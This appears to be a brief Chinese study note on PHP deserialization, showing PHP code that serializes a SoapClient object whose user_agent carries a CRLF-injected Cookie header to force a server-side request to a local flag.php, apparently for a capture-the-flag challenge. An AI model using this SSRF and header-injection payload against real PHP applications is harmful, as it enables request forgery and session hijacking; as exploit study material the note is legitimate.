- ## 内置类 SoapClient
- ```php
  <?php
  $a = new SoapClient(
    null,
    array(
        'uri'=>'bbb',
        'location'=>'http://127.0.0.1:81/flag.php',
        'user_agent'=>"test\r\nCookie: PHPSESSID=0mrbj32r0ptfcnf7l6kmmgh1c4"
    )
  );
  echo urlencode(serialize($a));
  # 利用: $a->notexist();
  ?>
  ```
- Error类:
	- ((62efc5c6-a0d5-4eab-906e-0db03366b1e9))
-